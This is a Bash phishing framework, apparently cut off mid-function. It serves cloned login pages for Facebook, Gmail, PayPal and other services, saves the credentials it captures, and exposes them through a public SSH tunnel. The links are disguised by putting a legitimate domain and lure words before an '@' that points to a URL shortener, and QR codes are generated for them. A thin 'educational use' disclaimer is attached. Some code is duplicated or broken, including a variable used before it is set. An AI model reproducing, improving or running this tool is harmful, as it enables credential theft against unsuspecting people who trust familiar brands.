#!/bin/bash

# ============================================
# ADVANCED PHISHING FRAMEWORK v5.0
# Professional Edition - Educational Purpose Only
# SSH Tunnel with ED25519 Key Authentication
# MaskPhish Technology Integrated
# 325+ Viral Templates Support
# SVG Inline Icons - No External Dependencies
# Autor:N2O
# ============================================

set -e

# ===== CONFIGURACIÓN INICIAL =====
VERSION="4.2"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$SCRIPT_DIR/config"
MODULES_DIR="$SCRIPT_DIR/modules"
LOGS_DIR="$SCRIPT_DIR/logs"
SITES_DIR="$SCRIPT_DIR/sites"
CAPTURES_DIR="$SCRIPT_DIR/captures"

# ===== COLORES PROFESIONALES =====
declare -A COLORS=(
    [BANNER]='\033[38;5;51m'
    [SUCCESS]='\033[38;5;46m'
    [WARNING]='\033[38;5;226m'
    [ERROR]='\033[38;5;196m'
    [INFO]='\033[38;5;33m'
    [MENU]='\033[38;5;201m'
    [INPUT]='\033[38;5;208m'
    [RESET]='\033[0m'
    [BOLD]='\033[1m'
)

# ===== VARIABLES GLOBALES =====
TARGET_SITE=""
DEPLOYMENT_MODE=""
SELECTED_PORT="5555"
TUNNEL_URL=""
MASK_URL_FLAG=0
PHP_PID=""
TUNNEL_PID=""
PLATFORM_CAPTURE_DIR=""

# ===== CREAR DIRECTORIOS =====
mkdir -p "$CONFIG_DIR" "$MODULES_DIR" "$LOGS_DIR" "$CAPTURES_DIR" "$SITES_DIR"
mkdir -p "$LOGS_DIR/reports"

# ===== VERIFICAR DEPENDENCIAS =====
check_dependencies() {
    local deps=("php" "ssh" "curl" "qrencode" "sqlite3" "python3")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${COLORS[WARNING]}[!] Missing dependencies: ${missing[*]}${COLORS[RESET]}"
        echo -e "${COLORS[INFO]}[*] Run: sudo apt install python3 python3-pip${COLORS[RESET]}"
    else
        echo -e "${COLORS[SUCCESS]}[✓] All dependencies installed${COLORS[RESET]}"
    fi
    
    # Verificar módulos Python
    if ! python3 -c "import requests, bs4" 2>/dev/null; then
        echo -e "${COLORS[WARNING]}[!] Python modules missing. Installing...${COLORS[RESET]}"
        pip3 install --quiet requests beautifulsoup4
        echo -e "${COLORS[SUCCESS]}[✓] Python modules installed${COLORS[RESET]}"
    fi
}

# ===== BANNER PROFESIONAL =====
show_banner() {
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    cat << "EOF"


╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║                       █████╗ ██████╗ ███████╗                     ║
║                      ██╔══██╗██╔══██╗██╔════╝                     ║ 
║                      ███████║██████╔╝█████╗                       ║
║                      ██╔══██║██╔═══╝ ██╔══╝                       ║
║                      ██║  ██║██║     ██║                          ║
║                      ╚═╝  ╚═╝╚═╝     ╚═╝                          ║
║                                                                   ║
║                     Avanced Phishing Framework                    ║
║                             Autor N2O                             ║
║                               v5.0                                ║
╚═══════════════════════════════════════════════════════════════════╝
EOF


    echo -e "${COLORS[RESET]}"
    
    echo -e "${COLORS[WARNING]}${COLORS[BOLD]}⚠️  LEGAL DISCLAIMER ⚠️${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}This tool is for EDUCATIONAL PURPOSES and AUTHORIZED TESTING only."
    echo -e "${COLORS[INFO]}Usage for unauthorized activities is ILLEGAL and PROHIBITED."
    echo -e "${COLORS[INFO]}By continuing, you accept full responsibility for compliance with laws."
    echo -e "${COLORS[RESET]}"

	echo -e "${COLORS[WARNING]}${COLORS[BOLD]}⚠️  LVISO LEGAL  ⚠️${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}Esta herramienta es solo para PROPOSITOS EDUCATIVOS y PRUEBAS AUTORIZADAS SOLAMENTE."
    echo -e "${COLORS[INFO]}El uso no autorizado de esta herramienta puede catalogarse como ACTIVIDADES ILEGALES Y PROHIBIDAS."
    echo -e "${COLORS[INFO]}PARA CONTINUAR, Usted acepta TODA LA RESPONSABILIDAD, tanto PARCIAL como TOTAL con la ley."
    echo -e "${COLORS[RESET]}"
    
    read -p "$(echo -e ${COLORS[INPUT]}"Press ENTER "if" accept and continue...${COLORS[RESET]}")"
}

# ===== CARGAR CONFIGURACIÓN =====
load_config() {
    if [[ ! -f "$CONFIG_DIR/settings.conf" ]]; then
        cat > "$CONFIG_DIR/settings.conf" << EOF
DEFAULT_PORT=5555
DEFAULT_TUNNEL_SERVICE="localhost.run"
LOG_LEVEL="INFO"
AUTO_CLEANUP=true
EOF
    fi
    source "$CONFIG_DIR/settings.conf"
    echo -e "${COLORS[SUCCESS]}[✓] Configuration loaded${COLORS[RESET]}"
}

# ===== VERIFICAR DEPENDENCIAS =====
check_dependencies() {
    local deps=("php" "ssh" "curl" "qrencode" "sqlite3")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${COLORS[WARNING]}[!] Missing dependencies: ${missing[*]}${COLORS[RESET]}"
    else
        echo -e "${COLORS[SUCCESS]}[✓] All dependencies installed${COLORS[RESET]}"
    fi
}

# ===== OBTENER DOMINIO ALTERNATIVO (DINÁMICO) =====
get_alternative_domain() {
    # Mapeo de dominios conocidos
    case $TARGET_SITE in
        facebook) echo "fb.co" ;;
        instagram) echo "ig.me" ;;
        tiktok) echo "vt.tiktok.com" ;;
        gmail) echo "mail.google.com" ;;
        twitter|x) echo "x.com" ;;
        netflix) echo "netflix.co" ;;
        github) echo "git.io" ;;
        linkedin) echo "linked.in" ;;
        *) echo "${TARGET_SITE}.com" ;;
    esac
}
# ===== MENÚ DE SELECCIÓN DE PLATAFORMA (DINÁMICO) =====
select_target_site() {
    echo -e "\n${COLORS[MENU]}${COLORS[BOLD]}╔════════════════════════════════════╗"
    echo -e "║     SELECT TARGET PLATFORM         ║"
    echo -e "╚════════════════════════════════════╝${COLORS[RESET]}\n"
    
    # Escanear todas las carpetas en sites/ que tengan index.html y verify.php
    local platforms=()
    local i=1
    
    echo -e "${COLORS[INFO]}Available platforms:${COLORS[RESET]}\n"
    
    for dir in "$SITES_DIR"/*/; do
        if [[ -d "$dir" ]]; then
            local name=$(basename "$dir")
            # Verificar que tiene los archivos mínimos
            if [[ -f "$dir/index.html" ]] && [[ -f "$dir/verify.php" ]]; then
                platforms+=("$name")
                # Capitalizar primera letra para mostrar
                local display_name=$(echo "$name" | sed 's/\b\(.\)/\u\1/')
                echo -e "${COLORS[SUCCESS]}$i)${COLORS[RESET]} $display_name"
                ((i++))
            fi
        fi
    done
    
    if [[ ${#platforms[@]} -eq 0 ]]; then
        echo -e "${COLORS[ERROR]}[✗] No platforms found!${COLORS[RESET]}"
        echo -e "${COLORS[INFO]}[*] Use option 4 in main menu to clone a website first.${COLORS[RESET]}"
        read -p "Press ENTER to continue..."
        return 1
    fi
    
    echo -e "${COLORS[INFO]}$i) ⬅️  Back to Main Menu${COLORS[RESET]}"
    
    while true; do
        read -p "$(echo -e ${COLORS[INPUT]}"Select option [1-$i]: "${COLORS[RESET]})" option
        if [[ "$option" =~ ^[0-9]+$ ]] && [[ "$option" -ge 1 ]] && [[ "$option" -lt "$i" ]]; then
            TARGET_SITE="${platforms[$((option-1))]}"
            break
        elif [[ "$option" -eq "$i" ]]; then
            return 1
        else
            echo -e "${COLORS[ERROR]}Invalid option. Please select 1-$i${COLORS[RESET]}"
        fi
    done
    
    echo -e "${COLORS[SUCCESS]}[✓] Target selected: $TARGET_SITE${COLORS[RESET]}"
    return 0
}

# ===== MENÚ DE MODO DE DESPLIEGUE =====
select_deployment_mode() {
    echo -e "\n${COLORS[MENU]}${COLORS[BOLD]}╔════════════════════════════════════╗"
    echo -e "║     SELECT DEPLOYMENT MODE         ║"
    echo -e "╚════════════════════════════════════╝${COLORS[RESET]}\n"
    
    echo -e "${COLORS[INFO]}1) Local Only (http://localhost:PORT)"
    echo -e "2) Tunnel Mode (SSH tunnel to internet)${COLORS[RESET]}"
    
    while true; do
        read -p "$(echo -e ${COLORS[INPUT]}"Select mode [1-2]: "${COLORS[RESET]})" mode
        case $mode in
            1) DEPLOYMENT_MODE="local"; break;;
            2) DEPLOYMENT_MODE="tunnel"; break;;
            *) echo -e "${COLORS[ERROR]}Invalid option${COLORS[RESET]}";;
        esac
    done
    
    echo -e "${COLORS[SUCCESS]}[✓] Mode selected: $DEPLOYMENT_MODE${COLORS[RESET]}"
}

# ===== CONFIGURACIÓN DE PUERTO =====
configure_port() {
    echo -e "\n${COLORS[INFO]}[*] Port Configuration${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}Default port: $DEFAULT_PORT${COLORS[RESET]}"
    
    read -p "$(echo -e ${COLORS[INPUT]}"Enter port number [default: $DEFAULT_PORT]: "${COLORS[RESET]})" custom_port
    
    if [[ -z "$custom_port" ]]; then
        SELECTED_PORT=$DEFAULT_PORT
    elif [[ "$custom_port" =~ ^[0-9]+$ ]] && [ "$custom_port" -ge 1024 ] && [ "$custom_port" -le 65535 ]; then
        SELECTED_PORT=$custom_port
    else
        echo -e "${COLORS[ERROR]}[!] Invalid port. Using default: $DEFAULT_PORT${COLORS[RESET]}"
        SELECTED_PORT=$DEFAULT_PORT
    fi
    
    echo -e "${COLORS[SUCCESS]}[✓] Port configured: $SELECTED_PORT${COLORS[RESET]}"
}

# ===== INICIALIZAR SISTEMA DE CAPTURAS (DINÁMICO) =====
init_capture_system() {
    # Generar código de plataforma automáticamente (primeras 3 letras en mayúsculas)
    local platform_code=$(echo "$TARGET_SITE" | cut -c1-3 | tr '[:lower:]' '[:upper:]')
    
    # Si el nombre es más corto, usar lo que tenga
    if [[ ${#platform_code} -lt 3 ]]; then
        platform_code=$(echo "$TARGET_SITE" | tr '[:lower:]' '[:upper:]')
    fi
    
    PLATFORM_CAPTURE_DIR="$CAPTURES_DIR/$platform_code"
    mkdir -p "$PLATFORM_CAPTURE_DIR"
    
    echo -e "${COLORS[SUCCESS]}[✓] Capture system ready: $platform_code${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}[*] Captures will be saved to: $PLATFORM_CAPTURE_DIR${COLORS[RESET]}"
}

# ===== INICIALIZAR SISTEMA DE CAPTURAS (ACTUALIZADO) =====
init_capture_system() {
    local platform_code=""
    
    case $TARGET_SITE in
        facebook) platform_code="FB";;
        instagram) platform_code="INS";;
        tiktok) platform_code="TK";;
        gmail) platform_code="GML";;
        twitter|x) platform_code="TWI";;
        netflix) platform_code="NFX";;
        github) platform_code="GIT";;
        linkedin) platform_code="LNK";;
        outlook) platform_code="OUT";;
        yahoo) platform_code="YAH";;
        dropbox) platform_code="DRP";;
        spotify) platform_code="SPT";;
        paypal) platform_code="PPL";;
        amazon) platform_code="AMZ";;
        apple) platform_code="APL";;
        discord) platform_code="DIS";;
        snapchat) platform_code="SNP";;
        pinterest) platform_code="PIN";;
        reddit) platform_code="RED";;
        twitch) platform_code="TWT";;
        ebay) platform_code="EBA";;
        adobe) platform_code="ADB";;
        steam) platform_code="STM";;
        roblox) platform_code="RBX";;
        *) 
            # Para plataformas clonadas dinámicamente
            platform_code=$(echo "$TARGET_SITE" | cut -c1-3 | tr '[:lower:]' '[:upper:]')
            ;;
    esac
    
    PLATFORM_CAPTURE_DIR="$CAPTURES_DIR/$platform_code"
    mkdir -p "$PLATFORM_CAPTURE_DIR"
    
    echo -e "${COLORS[SUCCESS]}[✓] Capture system ready: $platform_code${COLORS[RESET]}"
}

# ===== INICIAR SERVIDOR PHP (VERSIÓN ROBUSTA) =====
start_php_server() {
    echo -e "\n${COLORS[INFO]}[*] Starting PHP server on port $SELECTED_PORT...${COLORS[RESET]}"
    
    # Verificar que PHP está instalado
    if ! command -v php &> /dev/null; then
        echo -e "${COLORS[ERROR]}[✗] PHP is not installed${COLORS[RESET]}"
        echo -e "${COLORS[INFO]}[*] Install with: sudo apt-get install php php-cli${COLORS[RESET]}"
        return 1
    fi
    
    # Verificar que la carpeta existe
    if [[ ! -d "$SITES_DIR/$TARGET_SITE" ]]; then
        echo -e "${COLORS[ERROR]}[✗] Site directory not found: $SITES_DIR/$TARGET_SITE${COLORS[RESET]}"
        return 1
    fi
    
    # Verificar que hay archivos
    if [[ -z "$(ls -A "$SITES_DIR/$TARGET_SITE" 2>/dev/null)" ]]; then
        echo -e "${COLORS[ERROR]}[✗] No files found in $SITES_DIR/$TARGET_SITE${COLORS[RESET]}"
        return 1
    fi
    
    # Verificar si el puerto está ocupado
    if lsof -i:$SELECTED_PORT &> /dev/null; then
        echo -e "${COLORS[WARNING]}[!] Port $SELECTED_PORT is in use. Killing process...${COLORS[RESET]}"
        lsof -ti:$SELECTED_PORT | xargs kill -9 2>/dev/null
        sleep 1
    fi
    
    # Iniciar PHP server
    cd "$SITES_DIR/$TARGET_SITE"
    php -S "127.0.0.1:$SELECTED_PORT" > "$LOGS_DIR/php_server.log" 2>&1 &
    PHP_PID=$!
    cd "$SCRIPT_DIR"
    
    echo -e "${COLORS[INFO]}[*] Waiting for server to start...${COLORS[RESET]}"
    sleep 3
    
    # Verificar que el servidor está corriendo
    if ps -p $PHP_PID > /dev/null 2>&1; then
        # Verificar que responde
        if curl -s --head "http://127.0.0.1:$SELECTED_PORT" > /dev/null 2>&1; then
            echo -e "${COLORS[SUCCESS]}[✓] PHP server running on port $SELECTED_PORT (PID: $PHP_PID)${COLORS[RESET]}"
            
            if [[ "$DEPLOYMENT_MODE" == "local" ]]; then
                echo -e "\n${COLORS[BANNER]}═══════════════════════════════════════════════════════════"
                echo -e "  LOCAL URL: ${COLORS[SUCCESS]}http://localhost:$SELECTED_PORT"
                echo -e "${COLORS[BANNER]}═══════════════════════════════════════════════════════════${COLORS[RESET]}"
                
                if command -v xdg-open &> /dev/null; then
                    xdg-open "http://localhost:$SELECTED_PORT" 2>/dev/null &
                elif command -v open &> /dev/null; then
                    open "http://localhost:$SELECTED_PORT" 2>/dev/null &
                fi
            fi
            return 0
        else
            echo -e "${COLORS[ERROR]}[✗] PHP server started but not responding${COLORS[RESET]}"
            echo -e "${COLORS[INFO]}[*] Check logs: $LOGS_DIR/php_server.log${COLORS[RESET]}"
            return 1
        fi
    else
        echo -e "${COLORS[ERROR]}[✗] Failed to start PHP server${COLORS[RESET]}"
        echo -e "${COLORS[INFO]}[*] Check logs: $LOGS_DIR/php_server.log${COLORS[RESET]}"
        return 1
    fi
}

# ===== INICIAR TÚNEL SSH =====
start_ssh_tunnel() {
    if [[ "$DEPLOYMENT_MODE" != "tunnel" ]]; then
        return 0
    fi
    
    echo -e "\n${COLORS[INFO]}[*] Starting SSH tunnel to localhost.run...${COLORS[RESET]}"
    
    rm -f "$LOGS_DIR/current_url.txt"
    
    {
        ssh -o StrictHostKeyChecking=no \
            -o ServerAliveInterval=60 \
            -R "80:localhost:$SELECTED_PORT" \
            nokey@localhost.run 2>&1 | while IFS= read -r line; do
            echo "$line" >> "$LOGS_DIR/tunnel.log"
            
            if [[ "$line" =~ https://[a-zA-Z0-9.-]+\.lhr\.life ]]; then
                TUNNEL_URL=$(echo "$line" | grep -o 'https://[a-zA-Z0-9.-]*\.lhr\.life' | head -1)
                echo "$TUNNEL_URL" > "$LOGS_DIR/current_url.txt"
            elif [[ "$line" =~ https://[a-zA-Z0-9.-]+\.localhost\.run ]]; then
                TUNNEL_URL=$(echo "$line" | grep -o 'https://[a-zA-Z0-9.-]*\.localhost\.run' | head -1)
                echo "$TUNNEL_URL" > "$LOGS_DIR/current_url.txt"
            fi
        done
    } &
    
    TUNNEL_PID=$!
    
    echo -e "${COLORS[INFO]}[*] Waiting for tunnel URL...${COLORS[RESET]}"
    
    local attempts=0
    while [[ $attempts -lt 90 ]]; do
        if [[ -f "$LOGS_DIR/current_url.txt" ]]; then
            TUNNEL_URL=$(cat "$LOGS_DIR/current_url.txt" 2>/dev/null | tr -d '\n\r')
            if [[ -n "$TUNNEL_URL" ]]; then
                echo -e "\n${COLORS[BANNER]}${COLORS[BOLD]}═══════════════════════════════════════════════════════════"
                echo -e "  🔗 TUNNEL URL READY"
                echo -e "  ${COLORS[SUCCESS]}$TUNNEL_URL"
                echo -e "${COLORS[BANNER]}═══════════════════════════════════════════════════════════${COLORS[RESET]}"
                return 0
            fi
        fi
        sleep 1
        ((attempts++))
        
        if [[ $((attempts % 10)) -eq 0 ]]; then
            echo -ne "\r${COLORS[INFO]}[*] Still waiting... ($attempts seconds)${COLORS[RESET]}"
        fi
    done
    
    echo -e "\n${COLORS[ERROR]}[✗] Failed to get tunnel URL${COLORS[RESET]}"
    return 1
}

# ===== ENMASCARAMIENTO DE URL =====
url_masking_menu() {
    if [[ "$DEPLOYMENT_MODE" != "tunnel" ]] || [[ -z "$TUNNEL_URL" ]]; then
        return
    fi
    
    echo -e "\n${COLORS[MENU]}${COLORS[BOLD]}╔════════════════════════════════════╗"
    echo -e "║       URL MASKING STUDIO           ║"
    echo -e "║       (MaskPhish Technology)       ║"
    echo -e "╚════════════════════════════════════╝${COLORS[RESET]}\n"
    
    echo -e "${COLORS[INFO]}Original URL: ${COLORS[WARNING]}$TUNNEL_URL${COLORS[RESET]}\n"
    
    echo -e "${COLORS[MENU]}Select masking option:${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}1) 🎭 Quick Mask (Choose domain + words)"
    echo -e "2) 📚 Mask with Templates (325+ viral phrases)"
    echo -e "3) 🔗 Direct URL (No masking)"
    echo -e "4) 🔲 Generate QR Code only${COLORS[RESET]}"
    
    read -p "$(echo -e ${COLORS[INPUT]}"Select option [1-4]: "${COLORS[RESET]})" mask_choice
    
    case $mask_choice in
        1) maskphish_style "$TUNNEL_URL" ;;
        2) maskphish_with_templates "$TUNNEL_URL" ;;
        3) 
            MASK_URL_FLAG=0
            echo -e "${COLORS[INFO]}[*] Using original URL${COLORS[RESET]}"
            ;;
        4) 
            echo -e "\n${COLORS[INFO]}QR Code:${COLORS[RESET]}"
            qrencode -t ANSIUTF8 -m 2 -s 3 "$TUNNEL_URL"
            ;;
        *) 
            echo -e "${COLORS[ERROR]}Invalid option${COLORS[RESET]}"
            ;;
    esac
}

# ===== MASKPHISH STYLE - QUICK MASK =====
maskphish_style() {
    local original_url=$1
    
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                    MASKPHISH STUDIO                           ║
║              Hide URL behind legitimate domain                ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${COLORS[RESET]}"
    
    echo -e "\n${COLORS[INFO]}Original URL: ${COLORS[WARNING]}$original_url${COLORS[RESET]}"
    
    echo -e "\n${COLORS[MENU]}Select mask domain:${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}1) Facebook (facebook.com)"
    echo -e "2) Instagram (instagram.com)"
    echo -e "3) TikTok (tiktok.com)"
    echo -e "4) Google (google.com)"
    echo -e "5) Custom domain${COLORS[RESET]}"
    
    read -p "$(echo -e ${COLORS[INPUT]}"Select [1-5]: "${COLORS[RESET]})" domain_choice
    
    local mask_domain=""
    case $domain_choice in
        1) mask_domain="facebook.com" ;;
        2) mask_domain="instagram.com" ;;
        3) mask_domain="tiktok.com" ;;
        4) mask_domain="google.com" ;;
        5) read -p "Enter custom domain: " mask_domain ;;
        *) mask_domain="facebook.com" ;;
    esac
    
    echo -e "\n${COLORS[MENU]}Add social engineering words?${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}1) None (just domain)"
    echo -e "2) Security (secure-verify-confirm)"
    echo -e "3) Promo (offer-reward-giveaway)"
    echo -e "4) Custom words${COLORS[RESET]}"
    
    read -p "$(echo -e ${COLORS[INPUT]}"Select [1-4]: "${COLORS[RESET]})" word_choice
    
    local social_words=""
    case $word_choice in
        1) social_words="" ;;
        2) social_words="secure-verify-confirm" ;;
        3) social_words="offer-reward-giveaway" ;;
        4) read -p "Enter custom words (use hyphens): " social_words ;;
        *) social_words="" ;;
    esac
    
    echo -e "\n${COLORS[INFO]}[*] Shortening original URL...${COLORS[RESET]}"
    
    local short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$original_url")
    [[ -z "$short_url" ]] && short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$original_url")
    
    if [[ -z "$short_url" ]] || [[ "$short_url" == *"Error"* ]]; then
        echo -e "${COLORS[ERROR]}[✗] URL shortening failed${COLORS[RESET]}"
        read -p "Press ENTER to continue..."
        return 1
    fi
    
    echo -e "${COLORS[SUCCESS]}[✓] Shortened: $short_url${COLORS[RESET]}"
    
    local short_code=$(echo "$short_url" | awk -F'/' '{print $NF}')
    local masked_url=""
    
    if [[ -n "$social_words" ]]; then
        masked_url="https://${mask_domain}-${social_words}@is.gd/${short_code}"
    else
        masked_url="https://${mask_domain}@is.gd/${short_code}"
    fi
    
    echo -e "\n${COLORS[BANNER]}${COLORS[BOLD]}═══════════════════════════════════════════════════════════"
    echo -e "                    🎭 MASKED URL READY"
    echo -e "═══════════════════════════════════════════════════════════${COLORS[RESET]}"
    echo -e "${COLORS[SUCCESS]}$masked_url${COLORS[RESET]}"
    
    echo "$masked_url" > "$LOGS_DIR/masked_url.txt"
    MASK_URL_FLAG=1
    
    echo -e "\n${COLORS[MENU]}Generate QR code? [Y/n]${COLORS[RESET]}"
    read -p "" gen_qr
    if [[ "$gen_qr" =~ ^[Yy]?$ ]]; then
        echo -e "\n${COLORS[INFO]}QR Code:${COLORS[RESET]}"
        qrencode -t ANSIUTF8 -m 2 -s 3 "$masked_url"
    fi
    
    echo -e "\n${COLORS[SUCCESS]}[✓] Masked URL saved. Returning to campaign monitor...${COLORS[RESET]}"
    read -p "Press ENTER to continue..."
    return 0
}

# ===== MASKPHISH CON TEMPLATES =====
maskphish_with_templates() {
    local original_url=$1
    
    if [[ -f "$CONFIG_DIR/templates.conf" ]]; then
        source "$CONFIG_DIR/templates.conf"
    else
        echo -e "${COLORS[ERROR]}[!] templates.conf not found in $CONFIG_DIR${COLORS[RESET]}"
        echo -e "${COLORS[INFO]}[*] Falling back to Quick Mask...${COLORS[RESET]}"
        sleep 2
        maskphish_style "$original_url"
        return
    fi
    
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                 MASK + TEMPLATES STUDIO                       ║
║                  325+ Viral Templates                         ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${COLORS[RESET]}"
    
    echo -e "\n${COLORS[INFO]}Original URL: ${COLORS[WARNING]}$original_url${COLORS[RESET]}"
    
    echo -e "\n${COLORS[MENU]}Select mask domain:${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}1) Facebook"
    echo -e "2) Instagram"
    echo -e "3) TikTok"
    echo -e "4) Google"
    echo -e "5) Custom${COLORS[RESET]}"
    
    read -p "$(echo -e ${COLORS[INPUT]}"Select [1-5]: "${COLORS[RESET]})" domain_choice
    
    local mask_domain=""
    case $domain_choice in
        1) mask_domain="facebook.com" ;;
        2) mask_domain="instagram.com" ;;
        3) mask_domain="tiktok.com" ;;
        4) mask_domain="google.com" ;;
        5) read -p "Enter custom domain: " mask_domain ;;
        *) mask_domain="facebook.com" ;;
    esac
    
    echo -e "\n${COLORS[MENU]}Select template category:${COLORS[RESET]}"
    echo -e "${COLORS[INFO]}1) 💰 Money/Earnings (35)"
    echo -e "2) 🎬 Viral/Shocking (45)"
    echo -e "3) 🔒 Security Verification (30)"
    echo -e "4) 🎁 Promotions/Prizes (40)"
    echo -e "5) 📰 Breaking News (25)"
    echo -e "6) 📱 Platform Specific"
    echo -e "7) 🎲 Random Viral"
    echo -e "8) ✏️ Custom words (no template)${COLORS[RESET]}"
    
    read -p "$(echo -e ${COLORS[INPUT]}"Select [1-8]: "${COLORS[RESET]})" cat_choice
    
    local selected_words=""
    
    case $cat_choice in
        1) 
            templates=($money1 $money2 $money3 $money4 $money5 $money6 $money7 $money8 $money9 $money10 $money11 $money12 $money13 $money14 $money15 $money16 $money17 $money18 $money19 $money20 $money21 $money22 $money23 $money24 $money25 $money26 $money27 $money28 $money29 $money30 $money31 $money32 $money33 $money34 $money35)
            category_name="Money"
            ;;
        2) 
            templates=($viral1 $viral2 $viral3 $viral4 $viral5 $viral6 $viral7 $viral8 $viral9 $viral10 $viral11 $viral12 $viral13 $viral14 $viral15 $viral16 $viral17 $viral18 $viral19 $viral20 $viral21 $viral22 $viral23 $viral24 $viral25 $viral26 $viral27 $viral28 $viral29 $viral30 $viral31 $viral32 $viral33 $viral34 $viral35 $viral36 $viral37 $viral38 $viral39 $viral40 $viral41 $viral42 $viral43 $viral44 $viral45)
            category_name="Viral"
            ;;
        3) 
            templates=($verify1 $verify2 $verify3 $verify4 $verify5 $verify6 $verify7 $verify8 $verify9 $verify10 $verify11 $verify12 $verify13 $verify14 $verify15 $verify16 $verify17 $verify18 $verify19 $verify20 $verify21 $verify22 $verify23 $verify24 $verify25 $verify26 $verify27 $verify28 $verify29 $verify30)
            category_name="Security"
            ;;
        4) 
            templates=($promo1 $promo2 $promo3 $promo4 $promo5 $promo6 $promo7 $promo8 $promo9 $promo10 $promo11 $promo12 $promo13 $promo14 $promo15 $promo16 $promo17 $promo18 $promo19 $promo20 $promo21 $promo22 $promo23 $promo24 $promo25 $promo26 $promo27 $promo28 $promo29 $promo30 $promo31 $promo32 $promo33 $promo34 $promo35 $promo36 $promo37 $promo38 $promo39 $promo40)
            category_name="Promotions"
            ;;
        5) 
            templates=($news1 $news2 $news3 $news4 $news5 $news6 $news7 $news8 $news9 $news10 $news11 $news12 $news13 $news14 $news15 $news16 $news17 $news18 $news19 $news20 $news21 $news22 $news23 $news24 $news25)
            category_name="News"
            ;;
        6)
            case $mask_domain in
                *facebook*) templates=($fb1 $fb2 $fb3 $fb4 $fb5 $fb6 $fb7 $fb8 $fb9 $fb10 $fb11 $fb12 $fb13 $fb14 $fb15 $fb16 $fb17 $fb18 $fb19 $fb20 $fb21 $fb22 $fb23 $fb24 $fb25) ;;
                *instagram*) templates=($ig1 $ig2 $ig3 $ig4 $ig5 $ig6 $ig7 $ig8 $ig9 $ig10 $ig11 $ig12 $ig13 $ig14 $ig15 $ig16 $ig17 $ig18 $ig19 $ig20 $ig21 $ig22 $ig23 $ig24 $ig25) ;;
                *tiktok*) templates=($tk1 $tk2 $tk3 $tk4 $tk5 $tk6 $tk7 $tk8 $tk9 $tk10 $tk11 $tk12 $tk13 $tk14 $tk15 $tk16 $tk17 $tk18 $tk19 $tk20 $tk21 $tk22 $tk23 $tk24 $tk25) ;;
                *google*|*gmail*) templates=($gml1 $gml2 $gml3 $gml4 $gml5 $gml6 $gml7 $gml8 $gml9 $gml10 $gml11 $gml12 $gml13 $gml14 $gml15 $gml16 $gml17 $gml18 $gml19 $gml20) ;;
                *) templates=($viral1 $viral2 $viral3 $viral4 $viral5) ;;
            esac
            category_name="Platform"
            ;;
        7) 
            all_templates=($viral1 $viral2 $viral3 $money1 $verify1 $promo1 $news1 $fb1 $ig1 $tk1)
            selected_words="${all_templates[$RANDOM % ${#all_templates[@]}]}"
            ;;
        8) 
            maskphish_style "$original_url"
            return
            ;;
        *) 
            templates=($viral1 $viral2 $viral3 $viral4 $viral5)
            category_name="Default"
            ;;
    esac
    
    if [[ "$cat_choice" != "7" ]] && [[ "$cat_choice" != "8" ]]; then
        echo -e "\n${COLORS[INFO]}Available $category_name templates:${COLORS[RESET]}"
        
        local i=1
        local valid_templates=()
        for tpl in "${templates[@]}"; do
            if [[ -n "$tpl" ]]; then
                local display=$(echo "$tpl" | sed 's/-/ /g' | sed 's/\b\(.\)/\u\1/g')
                echo -e "${COLORS[SUCCESS]}$i)${COLORS[RESET]} $tpl"
                echo -e "   ${COLORS[INFO]}→ \"$display\"${COLORS[RESET]}"
                valid_templates+=("$tpl")
                ((i++))
            fi
        done
        
        echo -e "${COLORS[INFO]}$i) 🎲 Random from this category${COLORS[RESET]}"
        
        read -p "$(echo -e ${COLORS[INPUT]}"Select [1-$i]: "${COLORS[RESET]})" tpl_choice
        
        if [[ "$tpl_choice" -lt "$i" ]] 2>/dev/null; then
            selected_words="${valid_templates[$((tpl_choice-1))]}"
        else
            selected_words="${valid_templates[$RANDOM % ${#valid_templates[@]}]}"
        fi
    fi
    
    echo -e "\n${COLORS[INFO]}[*] Shortening URL...${COLORS[RESET]}"
    local short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$original_url")
    [[ -z "$short_url" ]] && short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$original_url")
    
    if [[ -z "$short_url" ]] || [[ "$short_url" == *"Error"* ]]; then
        echo -e "${COLORS[ERROR]}[✗] Shortening failed${COLORS[RESET]}"
        read -p "Press ENTER to continue..."
        return 1
    fi
    
    local short_code=$(echo "$short_url" | awk -F'/' '{print $NF}')
	# Limpiar dominio de https://
	local masked_url="https://${clean_domain}-${social_words}@is.gd/${short_code}"
	clean_domain=$(echo "$mask_domain" | sed 's|^https\?://||')
    
    echo -e "\n${COLORS[BANNER]}${COLORS[BOLD]}═══════════════════════════════════════════════════════════"
    echo -e "              🎭 MASKED URL (Template: $selected_words)"
    echo -e "═══════════════════════════════════════════════════════════${COLORS[RESET]}"
    echo -e "${COLORS[SUCCESS]}$masked_url${COLORS[RESET]}"
    
    echo "$masked_url" > "$LOGS_DIR/masked_url.txt"
    MASK_URL_FLAG=1
    
    echo -e "\n${COLORS[MENU]}Generate QR code? [Y/n]${COLORS[RESET]}"
    read -p "" gen_qr
    if [[ "$gen_qr" =~ ^[Yy]?$ ]]; then
